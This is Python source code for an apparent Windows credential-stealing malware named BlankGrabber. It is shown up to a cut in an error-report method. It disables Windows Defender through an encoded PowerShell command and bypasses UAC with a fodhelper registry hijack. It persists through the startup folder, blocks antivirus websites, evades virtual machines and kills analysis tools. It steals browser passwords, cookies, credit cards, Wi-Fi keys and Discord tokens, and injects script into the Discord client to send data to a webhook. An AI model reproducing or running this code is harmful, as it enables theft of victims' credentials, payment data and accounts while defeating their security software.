import os
import sys
import json
import time
import subprocess
import base64
import shutil
import random
import urllib3
import traceback
import sqlite3
import re
import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat

from threading import Thread
from win32crypt import CryptUnprotectData
from pyaes import AESModeOfOperationGCM, AESModeOfOperationCTR

if os.name != 'nt':
    os._exit(1)

if hasattr(sys, 'frozen'):
    MEIPASS = sys._MEIPASS
else:
    MEIPASS = os.path.dirname(__file__)

if os.path.isfile(configpath := os.path.join(MEIPASS, 'config.json')):
    with open(configpath) as file:
        _config = json.load(file)
else:
    _config = dict()

WEBHOOK =  '' # flag: faxxhookxxx Do not remove this flag
PINGME = _config.get('PINGME', True) # Pings @everyone
VMPROTECT = _config.get('VMPROTECT', True) # Exits if system is found to be VM
BSOD = _config.get('BSOD', False) # Tries to trigger blue screen if system is VM
STARTUP = _config.get('STARTUP', True) # Puts the grabber in startup
DELETE_ITSELF = _config.get('DELETE_ITSELF', True) # Deletes the grabber after use
MESSAGE_BOX = _config.get('MSGBOX', dict()) # Custom Message box
BLOCK_SITES = _config.get('BLOCK_SITES', False) # Blocks security related websites
INJECT_JS = _config.get('INJECT_JS', True) # Modify discord's index.js
CAPTURE_WEBCAM = False # Takes photo from the webcam (causes bugs, use at own risk)

class system:
    STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'

    @staticmethod
    def disableWD() -> None:
        cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode() #This line was triggering windows defender to delete the file so I encoded it
        subprocess.run(cmd, shell= True, capture_output= True)
    
    @staticmethod
    def WDexclude(path= None) -> None:
        if path is None:
            path = system.getSelf()[0]
        subprocess.run(f"powershell -Command Add-MpPreference -ExclusionPath '{path}'", shell= True, capture_output= True)
    
    @staticmethod
    def isInStartup() -> bool:
        path = os.path.dirname(system.getSelf()[0])
        return os.path.basename(path).lower() == 'startup'
    
    @staticmethod
    def isConnected() -> bool:
        http = urllib3.PoolManager()
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            return False
    
    @staticmethod
    def getSelf() -> tuple:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)
    
    @staticmethod
    def blockSites() -> None:
        if not system.isAdmin():
            return
        call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath', shell= True, capture_output= True)
        if call.returncode != 0:
            hostdirpath = os.path.join('System32', 'drivers', 'etc')
        else:
            hostdirpath = os.sep.join(call.stdout.decode(errors= 'ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
        hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath , 'hosts')
        if not os.path.isfile(hostfilepath):
            return
        with open(hostfilepath) as file:
            data = file.readlines()

        BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
        newdata = []
        for i in data:
            if any([(x in i) for x in BANNED_SITES]):
                continue
            else:
                newdata.append(i)

        for i in BANNED_SITES:
            newdata.append('\t0.0.0.0 {}'.format(i))
            newdata.append('\t0.0.0.0 www.{}'.format(i))

        newdata = '\n'.join(newdata).replace('\n\n', '\n')
        with open(hostfilepath, 'w') as file:
            file.write(newdata)

    
    @staticmethod
    def putInStartup() -> str:
        file, isExecutable = system.getSelf()
        if isExecutable:
            out = os.path.join(system.STARTUPDIR, '{}.scr'.format(utils.generate(invisible= True)))
        else:
            out = os.path.join(system.STARTUPDIR, '{}.py'.format(utils.generate()))
        shutil.copyfile(file, out)
        return out
    
    @staticmethod
    def isAdmin() -> bool:
        return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
    
    @staticmethod
    def unblockMOTW(path) -> None:
        if os.path.isfile(path):
            name = os.path.basename(path)
            dir = os.path.dirname(path)
            subprocess.run(f"powershell Unblock-File '.\{name}'", shell= True, capture_output= True, cwd= dir)
    
    @staticmethod
    def UACbypass():
        if not hasattr(sys, 'frozen'):
            return
        subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"{os.path.abspath(sys.executable)}\" /f", shell= True, capture_output= True)
        subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f", shell= True, capture_output= True)
        subprocess.run("fodhelper.exe", shell= True, capture_output= True)
        subprocess.run(f"reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1", shell= True, capture_output= True)
        os._exit(0)
    
    @staticmethod
    def deleteSelf():
        path, frozen = system.getSelf()
        if frozen:
            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

class utils:
    ERRORLOGS = list()

    @staticmethod
    def generate(num= 5, invisible= False) -> str:
        if not invisible:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
        else:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))
    
    @staticmethod
    def copy(src, dst) -> None:
        if not os.path.exists(src):
            return
        os.makedirs(os.path.dirname(dst), exist_ok= True)
        if os.path.isdir(src):
            shutil.copytree(src, dst)
        else:
            shutil.copyfile(src, dst)
    
    @staticmethod
    def catch(func):
        def newfunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    utils.ERRORLOGS.append(trb)
        return newfunc
    
    @staticmethod
    def messagebox(config) -> None:
        title = config.get("title")
        message = config.get("message")
        icon = config.get("icon")
        buttons = config.get("buttons")

        if not all(x is not None for x in (title, message, icon, buttons)):
            return
            
        title = title.replace("\x22", "\\x22").replace("\x27", "\\x22")
        message = message.replace("\x22", "\\x22").replace("\x27", "\\x22")
            
        cmd = f'''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{message}', 0, '{title}', {icon}+{buttons});close()"'''
        subprocess.Popen(cmd, shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
    
    @staticmethod
    def getWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()

        for line in subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
            if 'All User Profile' in line:
                name= line[(line.find(':') + 1):].strip()
                profiles.append(name)
        
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords
    
    @staticmethod
    def tree(path, DName= None) -> str:
        if DName is None:
            DName = os.path.basename(path)
        tree = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout.decode(errors= 'ignore')
        tree = tree.splitlines()
        tree = DName + "\n" + "\n".join(tree[3:])
        return tree.strip()

    @staticmethod
    def getClipboard() -> str:
        return subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode(errors= 'backslashreplace').strip()


class vmprotect:
    BLACKLISTED_HWIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkHWID() -> bool:
        hwid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
        return hwid in vmprotect.BLACKLISTED_HWIDS

    @staticmethod
    def checkComputerName() -> bool:
        computername = os.getenv("computername")
        return computername.lower() in vmprotect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        user = os.getlogin()
        return user.lower() in vmprotect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        http = urllib3.PoolManager()
        return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'

    @staticmethod
    def checkHTTPSimulation() -> bool:
        http = urllib3.PoolManager()
        try:
            http.request('GET', f'https://blank{utils.generate()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
        r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None:
        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
        for i in out:
            i = i.split("\r\n")[:2]
            name, pid = i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1])
            if not name in vmprotect.BLACKLISTED_TASKS:
                continue
            subprocess.run(f'taskkill /F /PID {pid}', shell= True, capture_output= True)

    @staticmethod
    def checkVM() -> bool:
        Thread(target= vmprotect.killTasks, daemon= True).start()
        return vmprotect.checkHWID() or vmprotect.checkComputerName() or vmprotect.checkUsers() or vmprotect.checkHosting() or vmprotect.checkRegistry() #or vmprotect.checkHTTPSimulation()

class Browsers:
    CHROMEENCRYPTIONKEY = None
    CHROMEPATH = os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data')

    @staticmethod
    def getChromeEncryptionKey() -> bytes:
        if Browsers.CHROMEENCRYPTIONKEY is not None:
            return Browsers.CHROMEENCRYPTIONKEY

        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        if not os.path.isfile(local_state_path):
            return
        
        with open(local_state_path) as file:
            tree = json.load(file)
        
        key = tree.get("os_crypt")
        if key is None:
            return
        
        key = key.get("encrypted_key")
        if key is None:
            return
        key = base64.b64decode(key)[5:]

        Browsers.CHROMEENCRYPTIONKEY = CryptUnprotectData(key, None, None, None, 0)[1]
        return Browsers.CHROMEENCRYPTIONKEY
    
    @staticmethod
    def chromeDecryptData(data) -> str:
        key = Browsers.getChromeEncryptionKey()
        if key is None:
            return None
        try:
            iv = data[3:15]
            data = data[15:]
            return (AESModeOfOperationGCM(key, iv).decrypt(data)[:-16]).decode()
        except Exception:
            try:                
                return str(CryptUnprotectData(data, None, None, None, 0)[1])
            except Exception:
                return None

    @staticmethod
    def getChromePass() -> list[dict]:
        Passwords = list()
        if not os.path.isdir(Browsers.CHROMEPATH) or not Browsers.getChromeEncryptionKey():
            return Passwords

        loginDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'login data':
                    filepath = os.path.realpath(os.path.join(root, file))
                    loginDataPaths.append(filepath)
        
        for path in loginDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'loginData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'loginData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall():
                URL, USERNAME, PASSWORD = res
                PASSWORD = Browsers.chromeDecryptData(PASSWORD)
                if URL and USERNAME and PASSWORD:
                    Passwords.append({
                        'URL' : URL,
                        'USERNAME' : USERNAME,
                        'PASSWORD' : PASSWORD
                    })
            cursor.close()
            db.close()
            os.remove(tempfile)
        return Passwords
    
    @staticmethod
    def getChromeCookies() -> list[dict]:
        Cookies = list()
        if not os.path.isdir(Browsers.CHROMEPATH) or not Browsers.getChromeEncryptionKey():
            return Cookies

        cookieDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'cookies':
                    filepath = os.path.realpath(os.path.join(root, file))
                    cookieDataPaths.append(filepath)
        
        for path in cookieDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'cookiesData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'cookiesData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall():
                HOST, NAME, PATH, COOKIE, EXPIRY = res
                COOKIE = Browsers.chromeDecryptData(COOKIE)
                if HOST and NAME and COOKIE:
                    Cookies.append({
                        'HOST' : HOST,
                        'NAME' : NAME,
                        'PATH' : PATH,
                        'COOKIE' : COOKIE,
                        'EXPIRY' : EXPIRY
                    })
            cursor.close()
            db.close()
            os.remove(tempfile)
        return Cookies

    @staticmethod
    def getChromeCC() -> list[dict]:
        Cards = list()
        if not os.path.isdir(Browsers.CHROMEPATH) or not Browsers.getChromeEncryptionKey():
            return Cards
        
        ccDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'web data':
                    filepath = os.path.realpath(os.path.join(root, file))
                    ccDataPaths.append(filepath)
        
        for path in ccDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'ccData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'ccData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards').fetchall():
                NAME, MONTH, YEAR, NUMBER = res
                if not (NAME and NUMBER):
                    continue
                NUMBER = Browsers.chromeDecryptData(NUMBER)
                Cards.append({
                    'NAME' : NAME,
                    'MONTH' : MONTH,
                    'YEAR' : YEAR,
                    'NUMBER' : NUMBER
                })
            cursor.close()
            db.close()
            os.remove(tempfile)

        return Cards
    
    @staticmethod
    def getChromeHistory() -> list[tuple]:
        History = list()
        if not os.path.isdir(Browsers.CHROMEPATH):
            return History
        
        historyDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'history':
                    filepath = os.path.realpath(os.path.join(root, file))
                    historyDataPaths.append(filepath)
        
        for path in historyDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'historyData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'historyData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall():
                URL, TITLE, VC, LVT = res
                if URL and TITLE and VC and LVT:
                    History.append((URL, TITLE, VC, LVT))
            History.sort(key= lambda x: x[3], reverse= True)
            cursor.close()
            db.close()
            os.remove(tempfile)
        return History

class Discord:
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    http = urllib3.PoolManager()

    @staticmethod
    def getHeaders(token= None):
        headers = {
        "content-type" : "application/json",
        "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }
        if token:
            headers["authorization"] = token

        return headers
    
    @staticmethod
    def injectJS():
        check = False
        if not os.path.isfile(injectionScript := os.path.join(MEIPASS, 'injection-obfuscated.js')) or not INJECT_JS:
            return
        with open(injectionScript, encoding= 'utf-8') as file:
            code = file.read().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(WEBHOOK.encode()).decode()))
        
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding= 'utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

    @staticmethod
    def getTokens() -> list[dict]:
        tokens = list()
        data = list()
        paths = {
            'Discord': os.path.join(Discord.ROAMING, 'discord'),
            'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'),
            'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'),
            'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'),
            'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'),
            'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'),
            'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'),
            'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'),
            'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'),
            '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'),
            'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'),
            'Chrome': Browsers.CHROMEPATH,
            'FireFox' : os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'),
            'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'),
            'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
            'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'),
            'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data'),
        }

        def RickRollDecrypt(path):

            @utils.catch
            def decrypt_token(encrypted_token, key):
                return (AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16]).decode(errors= 'ignore')

            encrypted_tokens = list()
            localstatepath = localstatepath = os.path.join(path, 'Local State')
            with open(localstatepath, 'r', errors= 'ignore') as keyfile:
                try:
                    key = json.load(keyfile)['os_crypt']['encrypted_key']
                except Exception:
                    return
            if not os.path.exists(lvldbdir := os.path.join(path, 'Local Storage', 'leveldb')):
                return
            for file in os.listdir(lvldbdir):
                if not file.endswith(('.log', '.ldb')):
                    continue
                else:
                    for line in [x.strip() for x in open(os.path.join(lvldbdir, file), errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            if token.endswith('\\'):
                                token = (token[::-1].replace('\\', '', 1))[::-1]
                            if not token in encrypted_tokens:
                                encrypted_tokens.append(token)

            for token in encrypted_tokens:
                token = decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                if token:
                    if not token in tokens:
                        tokens.append(token)

        def grabcord(path):
            for filename in os.listdir(path):
                if not filename.endswith(('.log', '.ldb')):
                    continue
                for line in [x.strip() for x in open(os.path.join(path, filename), errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line):
                        if not token in tokens:
                            tokens.append(token)
        
        def firefoxtokgrab(path):
            search = subprocess.run('where /r . *.sqlite', shell= True, capture_output= True, cwd = path).stdout.decode(errors= 'ignore')
            if search is not None:
                for path in search.splitlines():
                    if not os.path.isfile(path):
                        continue
                    for line in [x.strip() for x in open(path, errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line):
                            if not token in tokens:
                                tokens.append(token)

        token_threads = list()

        for path in paths.items():
            if not os.path.exists(path[1]):
                continue
            elif path[0] in ('FireFox'):
                if path[0] == 'FireFox':
                    t = Thread(target= lambda: firefoxtokgrab(path[1]))
                    token_threads.append(t)
                    t.start()
            else:
                t = Thread(target= lambda: RickRollDecrypt(path[1]))
                token_threads.append(t)
                t.start()
                nextPaths = subprocess.run('dir leveldb /AD /s /b', capture_output= True, shell= True, cwd= path[1]).stdout.decode(errors= 'ignore').strip().splitlines()
                for path in nextPaths:
                    if not os.path.exists(path):
                        continue
                    t = Thread(target= lambda: grabcord(path))
                    token_threads.append(t)
                    t.start()

        for i in token_threads:
            i.join()

        for token in tokens:
                token = token.strip()
                r = Discord.http.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.getHeaders(token))
                if r.status!=200:
                    continue
                r = json.loads(r.data.decode())
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified=r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {
                    0 : 'No Nitro',
                    1 : 'Nitro Classic',
                    2 : 'Nitro',
                    3 : 'Nitro Basic'
                }

                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                

                billing = json.loads(Discord.http.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.getHeaders(token)).data.decode())
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {
                        'Card' : 0,
                        'Paypal' : 0,
                        'Unknown' : 0
                    }
                    for m in billing:
                        method_type = m.get('type', 0)
                        if method_type == 0:
                            methods['Unknown'] += 1
                        elif method_type == 1:
                            methods['Card'] += 1
                        else:
                            methods['Paypal'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.http.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.getHeaders(token)).data.decode()
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None:
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                data.append({
                    'USERNAME' : user,
                    'USERID' : id,
                    'MFA' : mfa,
                    'EMAIL' : email,
                    'PHONE' : phone,
                    'VERIFIED' : verified,
                    'NITRO' : nitro_data,
                    'BILLING' : billing,
                    'TOKEN' : token,
                    'GIFTS' : gifts
                })
        return data

class BlankGrabber:
    def __init__(self) -> None:
        self.tempfolder = os.path.join(os.getenv('temp'), utils.generate(invisible= True))
        self.system = os.path.join(self.tempfolder, 'System')
        self.archive = os.path.join(os.getenv('temp'), 'Blank-{}.zip'.format(os.getlogin()))
        self.localappdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.http = urllib3.PoolManager()
        self.collection = {
            'Cookies' : 0,
            'Passwords' : 0,
            'Credit Cards' : 0,
            'History' : 0,
            'Webcam' : 0,
            'Discord Info' : 0,
            'Roblox Cookies' : 0,
            'Games' : 0,
            'Screenshot' : 0,
            'Wifi Passwords' : 0
        }

        while(os.path.isdir(self.tempfolder)):
            try:
                shutil.rmtree(self.tempfolder)
            except Exception:
                self.tempfolder = os.path.join(os.getenv('temp'), utils.generate(invisible= True))
        
        os.makedirs(self.system)
        if os.path.isfile(self.archive):
            os.remove(self.archive)
        
        threads = list()
        
        for func in (
            self.captureBrowserPasswords,
            self.captureChromeCookies,
            self.captureChromeCC,
            self.captureChromeHistory,
            self.captureWifiPasswords,
            self.minecraftStealer,
            self.misc,
            self.captureDiscordTokens,
            self.screenshot,
            self.webshot,
            self.getIPandSystemInfo,
            self.getPCInfo,
            self.discordInjection,
            self.blockSites()
        ):
            t = Thread(target= func)
            t.start()
            threads.append(t)
        
        for thread in threads:
            thread.join()
        
        self.errReport()
        self.send()
        try:
            self.cleanUp()
        except Exception:
            pass
    
    def errReport(self) -> None:
        if utils.ERRORLOGS:
